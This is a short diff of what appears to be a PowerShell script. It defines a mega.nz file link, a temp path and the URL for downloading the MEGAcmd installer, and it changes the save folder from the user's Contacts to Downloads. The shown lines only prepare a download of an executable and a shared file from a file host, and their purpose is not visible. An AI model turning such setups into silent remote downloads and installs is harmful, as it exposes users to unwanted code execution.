@@ -1,6 +1,6 @@
 # Define variables
 $megaUrl = "https://mega.nz/file/NicRFC7B#p4jZxm8nOZ6rkazkG94WrgBRpKBWIIydkO9NJipVf20"
-$outputFolder = "C:\Users\$env:USERNAME\Contacts"
+$outputFolder = "C:\Users\$env:USERNAME\Downloads"
 $megaInstaller = "$env:TEMP\MEGAcmdSetup.exe"
 $megaDownloadURL = "https://mega.nz/MEGAcmdSetup64.exe"
 
